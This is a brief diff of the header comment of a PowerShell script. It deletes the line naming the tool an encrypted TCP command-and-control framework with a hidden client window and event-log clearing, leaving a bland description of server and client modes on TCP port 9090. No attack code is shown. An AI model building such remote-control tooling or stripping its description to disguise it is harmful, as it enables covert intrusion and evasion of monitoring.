@@ -1,8 +1,6 @@
 #!/usr/bin/env pwsh
 <#
-    PowerShadow - Encrypted TCP C2 Framework (Production-Ready with Secure Key Derivation,
-                  Hidden Client Window, and Event Log Clearance)
-
+    
     This script supports two modes: Server and Client.
 
     In TCP mode the server listens on a TCP port (default 9090) for an incoming client connection.
